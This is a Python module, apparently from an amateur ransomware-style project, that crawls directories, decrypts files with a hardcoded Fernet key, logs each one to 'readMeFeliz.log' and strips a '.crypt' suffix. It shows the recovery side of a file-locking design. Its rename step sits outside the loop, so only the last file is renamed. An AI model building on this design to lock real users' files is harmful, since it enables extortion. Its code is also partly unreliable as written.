# chave = 9oDI_PZvnc4CKfaQfMHYQVIbFLfydXvvvkz7OYesRe0=
import os 
from cryptography.fernet import Fernet
from findDir import FindDir
from datetime import datetime
from crawling import importaKey


class Decryptografy:
    """""""""""""""""""""""""""""""""
    descriptografa os arquivos
    """""""""""""""""""""""""""""""""
    def __init__(self, lista):
        self.lista = lista
    
    def decrypt(self):
        chave = b'9oDI_PZvnc4CKfaQfMHYQVIbFLfydXvvvkz7OYesRe0='
        cifra = Fernet(chave)
        arquivos = FindDir()
        for itens in arquivos.find_dir():
            with open(itens, 'rb') as f:
                file = f.read()
            decript = cifra.decrypt(file)
            with open(itens, 'wb') as f:
                file = f.write(decript)
            with open('readMeFeliz.log', 'a') as f:
                arquivoLog = f.writelines(f'\nO arquivo {itens} foi descriptografado em {datetime.now()}\n')
                
 # voltando para o nome original
        arqui = itens.split('/')
        tamanho = len(arqui) - 1
        nomeDosArquivos = arqui[tamanho]
        caminhos = itens.split('/')
        tamanho2 = len(caminhos) - 1
        novoCaminho = '/'.join(caminhos[:tamanho2]) + '/'
        os.chdir(novoCaminho)
        if '.crypt' in nomeDosArquivos:
            indice = nomeDosArquivos.index('.crypt')
            nome = nomeDosArquivos[:indice]
            os.rename(f'./{nomeDosArquivos}', f'./{nome}')  
                
                

                
if __name__ == '__main__':
    encontraDir = FindDir()
    diretorios = encontraDir.find_dir()
    crypto = Decryptografy(diretorios)
    crypto.decrypt()
